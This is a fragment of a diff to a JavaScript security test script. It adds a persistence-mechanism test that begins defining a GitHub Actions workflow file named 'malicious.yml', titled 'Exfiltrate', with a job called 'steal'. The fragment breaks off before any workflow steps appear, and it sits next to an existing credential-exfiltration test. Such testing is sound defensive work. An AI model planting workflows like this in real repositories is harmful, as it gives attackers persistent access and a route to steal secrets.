@@ -333,3 +333,18 @@ async function testCredentialExfiltration() {
 }
 
 // ============================================
+// 6. PERSISTENCE MECHANISM TESTS
+// ============================================
+async function testPersistenceMechanisms() {
+  log('\n🔄 TESTING PERSISTENCE MECHANISMS', 'cyan');
+  log('='.repeat(50));
+  
+  const persistenceTests = [
+    {
+      name: 'GitHub Actions Workflow',
+      path: path.join(process.cwd(), '.github/workflows/malicious.yml'),
+      content: `
+name: Exfiltrate
+on: [push]
+jobs:
+  steal:
